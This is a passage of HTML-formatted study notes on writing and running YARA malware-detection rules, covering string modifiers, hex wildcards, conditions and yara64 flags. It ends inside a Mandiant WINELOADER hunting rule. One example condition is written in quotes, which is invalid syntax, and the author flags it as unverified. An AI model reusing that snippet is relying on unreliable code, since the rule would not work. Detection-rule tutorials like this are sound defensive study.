options:&lt;/p&gt;&lt;p&gt;&lt;ul&gt;&lt;li&gt;Learn to write detailed YARA rules yourself.&lt;/li&gt;&lt;li&gt;Use rules made by experts (like those from threat intelligence reports).&lt;/li&gt;&lt;/ul&gt;&lt;p&gt;You can also combine both approaches. Even if you use pre-made rules, it’s important to understand how they work.&lt;/p&gt;&lt;p&gt;&lt;strong&gt;Text String&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Strings are case sensitive.&lt;/p&gt;&lt;pre class=&quot;yara&quot;&gt;&lt;br&gt;&lt;span class=&quot;rulename&quot;&gt;rule textString&lt;/span&gt;&lt;br&gt;{&lt;br&gt;  &lt;span class=&quot;section&quot;&gt;strings:&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;This is an ASCII-encoded string&quot;&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;//strings are defined between double quotes&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;key&quot;&gt;$2&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;This is an ascii-encoded string&quot;&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;//not the same as $1.&lt;/span&gt;&lt;br&gt;&lt;br&gt;  &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;condition&quot;&gt;all of them&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;&lt;br&gt;&lt;pre class=&quot;yara&quot;&gt;&lt;br&gt;&lt;span class=&quot;rulename&quot;&gt;rule noCaseTextString&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;strings:&lt;/span&gt; &lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;This is an ASCII-encoded string&quot;&lt;/span&gt; &lt;span class=&quot;key&quot;&gt;nocase&lt;/span&gt;&lt;br&gt;    &lt;br&gt;    &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;  &lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;&lt;p&gt;&lt;b&gt;Wide-Character Strings&lt;/b&gt;&lt;/p&gt;Used for special encoded strings. It is possible to use a modifier next to the defined string so the rule matches for this wide-character string. In this case the modifier used is &lt;b&gt;wide&lt;/b&gt;.&lt;pre class=&quot;yara&quot;&gt;&lt;br&gt;&lt;span class=&quot;rulename&quot;&gt;rule wideTextString&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;strings:&lt;/span&gt; &lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;tryhackme&quot;&lt;/span&gt; &lt;span class=&quot;key&quot;&gt;wide&lt;/span&gt;      &lt;span class=&quot;comment&quot;&gt;// will match with t\x00r\x00y\x00h\x00a\x00c\x00k\x00m\x00e\x00&lt;/span&gt;&lt;br&gt;    &lt;br&gt;    &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;  &lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Hexadecimal String&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;When malware analysts study malware, they use tools like IDA Pro to break down the code, which often appears in hexadecimal format. These hexadecimal strings can be used to create YARA rules because they are harder for attackers to hide or change. This makes them a reliable way to identify specific malicious files.&lt;/p&gt;&lt;pre class=&quot;yara&quot;&gt;&lt;br&gt;&lt;span class=&quot;rulename&quot;&gt;rule hexString&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;strings:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; = &lt;span class=&quot;hex&quot;&gt;{ E2 34 B6 C8 A3 FB }&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;// Hexadecimal strings are defined between {}&lt;/span&gt;&lt;br&gt;    &lt;br&gt;    &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;&lt;br&gt;&lt;pre class=&quot;yara&quot;&gt;&lt;br&gt;&lt;span class=&quot;rulename&quot;&gt;rule hexStringExpanded&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;strings:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; = &lt;span class=&quot;hex&quot;&gt;{ E2 34 B6 ?? A3 FB }&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;// The ? is a wildcard and can represent any hex value.&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$2&lt;/span&gt; = &lt;span class=&quot;hex&quot;&gt;{ E2 34 B6 ~00 A3 FB }&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;// The ~ is a not operator that precedes the value to exclude from the search. In this case 00.&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$3&lt;/span&gt; = &lt;span class=&quot;hex&quot;&gt;{ E2 34 [2-4] A3 FB }&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;// The [X-Y] construct defines a jump. This means that any value between 2 and 4 bytes can occupy this position.&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$4&lt;/span&gt; = &lt;span class=&quot;hex&quot;&gt;{ E2 34 (C5|B5) A3 FB }&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;// Between () alternative byte sequences can be defined separated with the boolean operator OR. The value can be B5 OR C5.&lt;/span&gt;&lt;br&gt;    &lt;br&gt;    &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;XOR String&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;Malware creators use XOR encryption to hide their code, making it harder for analysts to analyze and avoid detection by antivirus software. YARA helps by detecting these encrypted strings, even when the encryption uses 1-byte keys.&lt;/p&gt;&lt;pre class=&quot;yara&quot;&gt;&lt;br&gt;&lt;span class=&quot;rulename&quot;&gt;rule xorString&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;strings:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;http://maliciousurl.thm&quot;&lt;/span&gt; &lt;span class=&quot;key&quot;&gt;xor&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;// This line will look for all variations possible with a 1-byte XOR key&lt;/span&gt;&lt;br&gt;    &lt;br&gt;    &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;&lt;br&gt;&lt;pre class=&quot;yara&quot;&gt;&lt;span class=&quot;rulename&quot;&gt;rule base64String&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;strings:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;This is a regular string&quot;&lt;/span&gt; &lt;span class=&quot;key&quot;&gt;base64&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;// At runtime YARA will encode the string with base64 and look for matches.&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;&lt;br&gt;     &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;&lt;p&gt;&lt;strong&gt;Regular Expressions&lt;/strong&gt;&lt;/p&gt;&lt;p&gt;You can define regular expressions the same way as strings, with the only difference being forward slashes instead of double quotes.&lt;/p&gt;&lt;pre class=&quot;yara&quot;&gt;&lt;span class=&quot;rulename&quot;&gt;rule regularExpression&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;strings:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;/THM\{[a-zA-Z]{3}\}/&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;// This regex will match any string that starts with &quot;THM{&quot;, ends with &quot;}&quot; and has 3 alphabetic characters (lower-case or upper-case) between the curly brackets.&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;&lt;br&gt;&lt;br&gt;&lt;table &gt;&lt;thead &gt;&lt;tr &gt;&lt;th &gt;Boolean operators&lt;/th&gt;&lt;th &gt;Relational operators&lt;/th&gt;&lt;th &gt;Arithmetic operators&lt;/th&gt;&lt;th &gt;Bitwise operators&lt;/th&gt;&lt;th &gt;Keywords&lt;/th&gt;&lt;/tr&gt;&lt;/thead&gt;&lt;tbody &gt;&lt;tr &gt;&lt;td &gt;and&lt;/td&gt;&lt;td &gt;&amp;gt;=&lt;/td&gt;&lt;td &gt;+&lt;/td&gt;&lt;td &gt;&amp;amp;&lt;/td&gt;&lt;td &gt;1 of them&lt;/td&gt;&lt;/tr&gt;&lt;tr &gt;&lt;td &gt;or&lt;/td&gt;&lt;td &gt;&amp;lt;=&lt;/td&gt;&lt;td &gt;-&lt;/td&gt;&lt;td &gt;|&lt;/td&gt;&lt;td &gt;any of them&lt;/td&gt;&lt;/tr&gt;&lt;tr &gt;&lt;td &gt;not&lt;/td&gt;&lt;td &gt;&amp;lt;&lt;/td&gt;&lt;td &gt;*&lt;/td&gt;&lt;td &gt;&amp;lt;&amp;lt;&lt;/td&gt;&lt;td &gt;none of them&lt;/td&gt;&lt;/tr&gt;&lt;tr &gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;&amp;gt;&lt;/td&gt;&lt;td &gt;\&lt;/td&gt;&lt;td &gt;&amp;gt;&amp;gt;&lt;/td&gt;&lt;td &gt;contains&lt;/td&gt;&lt;/tr&gt;&lt;tr &gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;==&lt;/td&gt;&lt;td &gt;%&lt;/td&gt;&lt;td &gt;~&lt;/td&gt;&lt;td &gt;icontains&lt;/td&gt;&lt;/tr&gt;&lt;tr &gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;!=&lt;/td&gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;^&lt;/td&gt;&lt;td &gt;startswith&lt;/td&gt;&lt;/tr&gt;&lt;tr &gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;istartswith&lt;/td&gt;&lt;/tr&gt;&lt;tr &gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;endswith&lt;/td&gt;&lt;/tr&gt;&lt;tr &gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;iendswith&lt;/td&gt;&lt;/tr&gt;&lt;tr &gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;iequals&lt;/td&gt;&lt;/tr&gt;&lt;tr &gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;matches&lt;/td&gt;&lt;/tr&gt;&lt;tr &gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;not defined&lt;/td&gt;&lt;/tr&gt;&lt;tr &gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;&lt;/td&gt;&lt;td &gt;filesize&lt;/td&gt;&lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;p&gt;Some examples:&lt;/p&gt;&lt;pre class=&quot;yara&quot;&gt;&lt;span class=&quot;rulename&quot;&gt;rule differentConditions&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;strings:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Try&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$2&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Hack&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$3&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Me&quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;all&lt;/span&gt; &lt;span class=&quot;key&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;key&quot;&gt;them&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;// Matches when all defined strings are present.&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;&lt;br&gt;&lt;pre class=&quot;yara&quot;&gt;&lt;span class=&quot;rulename&quot;&gt;rule differentConditions&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;strings:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Try&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$2&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Hack&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$3&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Me&quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;any&lt;/span&gt; &lt;span class=&quot;key&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;key&quot;&gt;them&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;// Matches when at least one of the defined strings is present.&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;&lt;br&gt;&lt;pre class=&quot;yara&quot;&gt;&lt;span class=&quot;rulename&quot;&gt;rule differentConditions&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;strings:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Try&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$2&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Hack&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$3&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Me&quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;1&lt;/span&gt; &lt;span class=&quot;key&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;string&quot;&gt;$(*)&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;// Identical to &quot;any of them&quot; condition.&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;&lt;br&gt;&lt;pre class=&quot;yara&quot;&gt;&lt;span class=&quot;rulename&quot;&gt;rule differentConditions&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;strings:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Try&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$2&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Hack&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$3&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Me&quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;string&quot;&gt;&quot;$1 or $2&quot;&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;// Matches when &apos;Try&apos; or &apos;Hack&apos; is present.&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;&lt;p&gt;&lt;span style=&quot;color:#FFC107&quot;&gt;In the example above, it seems there is an error as the condition in quotes and the next one is not. I have to verify if the quotes changes the behavior or is intended.&lt;/span&gt;&lt;/p&gt;&lt;pre class=&quot;yara&quot;&gt;&lt;span class=&quot;rulename&quot;&gt;rule differentConditions&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;strings:&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Try&quot;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;key&quot;&gt;$2&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Hack&quot;&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;key&quot;&gt;$3&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Me&quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;&lt;br&gt;        &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;key&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;key&quot;&gt;$2&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;// Matches when &apos;Try&apos; and &apos;Hack&apos; are present.&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;&lt;br&gt;&lt;pre class=&quot;yara&quot;&gt;&lt;span class=&quot;rulename&quot;&gt;rule differentConditions&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;strings:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Try&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$2&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Hack&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$3&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Me&quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;key&quot;&gt;and&lt;/span&gt; (&lt;span class=&quot;key&quot;&gt;$2&lt;/span&gt; &lt;span class=&quot;key&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;key&quot;&gt;$3&lt;/span&gt;) &lt;span class=&quot;comment&quot;&gt;// Matches when &apos;Try&apos; and &apos;Hack&apos; or &apos;Try&apos; and &apos;Me&apos; combinations are present.&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;&lt;br&gt;&lt;pre class=&quot;yara&quot;&gt;&lt;span class=&quot;rulename&quot;&gt;rule differentConditions&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;strings:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Try&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$2&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Hack&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$3&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Me&quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;none&lt;/span&gt; &lt;span class=&quot;key&quot;&gt;of&lt;/span&gt; &lt;span class=&quot;key&quot;&gt;them&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;// Matches only when none of the defined strings are present.&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;&lt;br&gt;&lt;pre class=&quot;yara&quot;&gt;&lt;span class=&quot;rulename&quot;&gt;rule differentConditions&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;strings:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Try&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$2&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Hack&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$3&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Me&quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;filesize&lt;/span&gt; &lt;span class=&quot;key&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;key&quot;&gt;500KB&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;// Matches all files smaller than 500 KiloByte. This can only be used when matching for files.&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;&lt;br&gt;&lt;pre class=&quot;yara&quot;&gt;&lt;span class=&quot;rulename&quot;&gt;rule differentConditions&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;strings:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Try&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$2&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Hack&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;$3&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Me&quot;&lt;/span&gt;&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;condition:&lt;/span&gt;&lt;br&gt;      (&lt;span class=&quot;key&quot;&gt;$1&lt;/span&gt; &lt;span class=&quot;key&quot;&gt;or&lt;/span&gt; &lt;span class=&quot;key&quot;&gt;$2&lt;/span&gt;) &lt;span class=&quot;key&quot;&gt;and&lt;/span&gt; &lt;span class=&quot;key&quot;&gt;filesize&lt;/span&gt; &lt;span class=&quot;key&quot;&gt;&amp;lt;&lt;/span&gt; &lt;span class=&quot;key&quot;&gt;200KB&lt;/span&gt; &lt;span class=&quot;comment&quot;&gt;// Matches for &apos;Try&apos; or &apos;Hack&apos; in files smaller than 200KB.&lt;/span&gt;&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;&lt;br&gt;&lt;p&gt;&lt;b&gt;Q:&lt;/b&gt; &lt;i&gt;What modifier should be used if you want to search for 2-byte encoded characters?&lt;/i&gt;&lt;br&gt;&lt;b&gt;A:&lt;/b&gt; &lt;i&gt;wide&lt;/i&gt;&lt;/p&gt;&lt;p&gt;&lt;b&gt;Q:&lt;/b&gt; &lt;i&gt;What condition should be used if you want to exclude the defined strings from the matching process?&lt;/i&gt;&lt;br&gt;&lt;b&gt;A:&lt;/b&gt; &lt;i&gt;none of them&lt;/i&gt;&lt;/p&gt;&lt;p&gt;Execute Yara rules with &lt;code&gt;yara64&lt;/code&gt;.&lt;/p&gt;&lt;pre class=&quot;powershell&quot;&gt;PS C:\TMP&gt; yara64&lt;br&gt;yara: wrong number of arguments  # Red text (error)&lt;br&gt;Usage: yara [OPTION]... [NAMESPACE:]RULES_FILE... FILE | DIR | PID  # Cyan text (help/usage)&lt;br&gt;Try `--help` for more options  # Cyan text (help)&lt;/pre&gt;&lt;p&gt;Use the argument &lt;code&gt;--help&lt;/code&gt; to see the available options.&lt;/p&gt;&lt;table&gt;  &lt;tbody&gt;&lt;tr&gt;    &lt;th&gt;Short Flag&lt;/th&gt;    &lt;th&gt;Long Flag&lt;/th&gt;    &lt;th&gt;Description&lt;/th&gt;  &lt;/tr&gt;  &lt;tr&gt;    &lt;td&gt;-r&lt;/td&gt;    &lt;td&gt;--recursive&lt;/td&gt;    &lt;td&gt;Scan directories recursively&lt;/td&gt;  &lt;/tr&gt;  &lt;tr&gt;    &lt;td&gt;-n&lt;/td&gt;    &lt;td&gt;--negate&lt;/td&gt;    &lt;td&gt;Print only rules that weren&apos;t matched&lt;/td&gt;  &lt;/tr&gt;  &lt;tr&gt;    &lt;td&gt;-S&lt;/td&gt;    &lt;td&gt;--print-stats&lt;/td&gt;    &lt;td&gt;Print metadata related to the performance and efficiency of the rule&lt;/td&gt;  &lt;/tr&gt;  &lt;tr&gt;    &lt;td&gt;-s&lt;/td&gt;    &lt;td&gt;--print-strings&lt;/td&gt;    &lt;td&gt;Print the strings that were matched in a file&lt;/td&gt;  &lt;/tr&gt;  &lt;tr&gt;    &lt;td&gt;-X&lt;/td&gt;    &lt;td&gt;--print-xor-key&lt;/td&gt;    &lt;td&gt;Print xor key and plaintext of matched strings&lt;/td&gt;  &lt;/tr&gt;  &lt;tr&gt;    &lt;td&gt;-v&lt;/td&gt;    &lt;td&gt;--version&lt;/td&gt;    &lt;td&gt;Show the YARA version&lt;/td&gt;  &lt;/tr&gt;  &lt;tr&gt;    &lt;td&gt;-p&lt;/td&gt;    &lt;td&gt;--threads=N&lt;/td&gt;    &lt;td&gt;Use N threads to scan a directory&lt;/td&gt;  &lt;/tr&gt;&lt;/tbody&gt;&lt;/table&gt;&lt;br&gt;&lt;br&gt;&lt;pre class=&quot;powershell-code&quot;&gt;PS C:\TMP&amp;gt;&lt;span class=&quot;cmdlet&quot;&gt;get-content&lt;/span&gt; C:\TMP\YARARULES\myfirstrule.yar&lt;br&gt;rule myfirstrule &lt;br&gt;{&lt;br&gt;    meta:&lt;br&gt;        Description = &quot;Searches for the string tryhackme&quot;&lt;br&gt;        Author = &quot;TryHackMe&quot;&lt;br&gt;    &lt;br&gt;    strings:&lt;br&gt;        $s = &quot;tryhackme&quot;&lt;br&gt; &lt;br&gt;    condition:&lt;br&gt;        $s&lt;br&gt;}&lt;br&gt;&lt;/pre&gt;&lt;p&gt;This rule searches for the string &lt;em&gt;tryhackme&lt;/em&gt; in the give directory as argument. For example if the target directory where I want to search is &lt;code&gt;C:\TMP&lt;/code&gt; I have to run the following command.&lt;/p&gt;&lt;pre class=&quot;powershell-code&quot;&gt;PS C:\TMP&gt; &lt;span class=&quot;cmdlet&quot;&gt;yara64&lt;/span&gt; C:\TMP\YARARULES\myfirstrule.yar C:\TMP\&lt;br&gt;myfirstrule C:\TMP\test.txt&lt;/pre&gt;&lt;br&gt;&lt;p&gt;The result shows that the string matches inside the file &lt;code&gt;C:\TMP\test.txt&lt;/code&gt;&lt;/p&gt;&lt;p&gt;Putting multiple YARA rules in one file can make things easier, especially when they focus on the same malware, campaign, or purpose. For example, if you’re tracking a malware family with different versions, having all the rules in one file keeps everything organized and easier to use. The same goes for investigating a phishing campaign—grouping rules for emails, payloads, and domains into one file makes the process smoother.&lt;/p&gt;&lt;p&gt;On the other hand, if the rules are unrelated, it’s better to keep them in separate files. This avoids confusion and makes updates easier. The idea is simple: combine rules that share a common goal to keep things clear and efficient, but don’t lump everything together just for the sake of it.&lt;/p&gt;&lt;pre class=&quot;yara&quot;&gt;&lt;span class=&quot;rulename&quot;&gt;rule M_APT_Downloader_WINELOADER_1&lt;/span&gt;&lt;br&gt;{&lt;br&gt;    &lt;span class=&quot;section&quot;&gt;meta:&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;author&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Mandiant&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;disclaimer&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;This rule is meant for hunting and is not tested to run in a production environment.&quot;&lt;/span&gt;&lt;br&gt;      &lt;span class=&quot;key&quot;&gt;description&lt;/span&gt; = &lt;span class=&quot;string&quot;&gt;&quot;Detects rc4 decryption logic in WINELOADER samples&quot;&lt;/span&gt;&lt;br&gt;&lt;br&gt;    &lt;span 